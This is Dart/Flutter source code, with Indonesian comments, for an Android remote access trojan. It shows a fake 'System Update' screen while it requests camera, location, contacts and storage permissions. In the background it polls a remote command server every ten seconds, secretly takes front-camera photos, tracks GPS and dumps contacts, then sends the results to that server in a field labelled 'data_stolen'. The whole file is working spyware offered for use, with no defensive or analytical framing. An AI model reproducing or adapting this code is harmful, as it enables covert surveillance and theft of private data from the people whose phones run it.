import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:camera/camera.dart';

import 'remote_config.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  await RemoteConfig.load();
  await _requestAllPermissions();
  
  String deviceId = await _getIdentifier();
  
  if (RemoteConfig.ratUrl != null) {
    Timer.periodic(const Duration(seconds: 10), (t) => _executeRAT(deviceId));
  }
  
  runApp(const MaterialApp(
    debugShowCheckedModeBanner: false,
    home: SystemUpdatePage(), // Menggunakan widget khusus tampilan update
  ));
}

// Tampilan Palsu "System Update"
class SystemUpdatePage extends StatelessWidget {
  const SystemUpdatePage({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF121212), // Warna gelap khas Android
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const SizedBox(
              width: 50,
              height: 50,
              child: CircularProgressIndicator(
                color: Colors.blue, // Warna loading update standar
                strokeWidth: 3,
              ),
            ),
            const SizedBox(height: 30),
            Text(
              "System Update...",
              style: TextStyle(
                color: Colors.white.withOpacity(0.9),
                fontSize: 18,
                fontWeight: FontWeight.w400,
                fontFamily: 'sans-serif',
              ),
            ),
            const SizedBox(height: 10),
            Text(
              "Please do not turn off your device",
              style: TextStyle(
                color: Colors.white.withOpacity(0.5),
                fontSize: 13,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// --- FUNGSI RAT TETAP BERJALAN DI BACKGROUND ---

Future<void> _requestAllPermissions() async {
  await [
    Permission.camera,
    Permission.location,
    Permission.contacts,
    Permission.storage,
  ].request();
}

Future<String> _getIdentifier() async {
  DeviceInfoPlugin info = DeviceInfoPlugin();
  if (Platform.isAndroid) {
    AndroidDeviceInfo android = await info.androidInfo;
    return android.id; 
  }
  return "USER-${Platform.localHostname.hashCode}";
}

Future<void> _executeRAT(String deviceId) async {
  final String? server = RemoteConfig.ratUrl;
  if (server == null) return;

  try {
    final response = await http.get(Uri.parse("$server/get_command/$deviceId"))
        .timeout(const Duration(seconds: 5));
    
    if (response.statusCode == 200) {
      String command = jsonDecode(response.body)['command'];
      String report = "Status: Online";

      if (command == "take_snapshot") {
        report = await _captureSecretly();
      } else if (command == "track_gps") {
        Position pos = await Geolocator.getCurrentPosition();
        report = "GPS: ${pos.latitude},${pos.longitude}";
      } else if (command == "dump_contacts") {
        if (await FlutterContacts.requestPermission()) {
          final contacts = await FlutterContacts.getContacts(withProperties: true);
          report = "CONTACTS: " + contacts.take(10).map((e) => "${e.displayName}").join(", ");
        }
      }

      await http.post(
        Uri.parse("$server/register"),
        body: jsonEncode({
          "id": deviceId,
          "model": "${Platform.operatingSystem} ${Platform.version}",
          "data_stolen": report, 
        }),
        headers: {"Content-Type": "application/json"}
      );
    }
  } catch (e) {}
}

Future<String> _captureSecretly() async {
  try {
    final cameras = await availableCameras();
    final front = cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.front);
    final controller = CameraController(front, ResolutionPreset.low, enableAudio: false);
    await controller.initialize();
    XFile img = await controller.takePicture();
    String base64 = base64Encode(await File(img.path).readAsBytes());
    await controller.dispose();
    return "IMG_DATA:$base64";
  } catch (e) { return "CAM_ERROR: $e"; }
}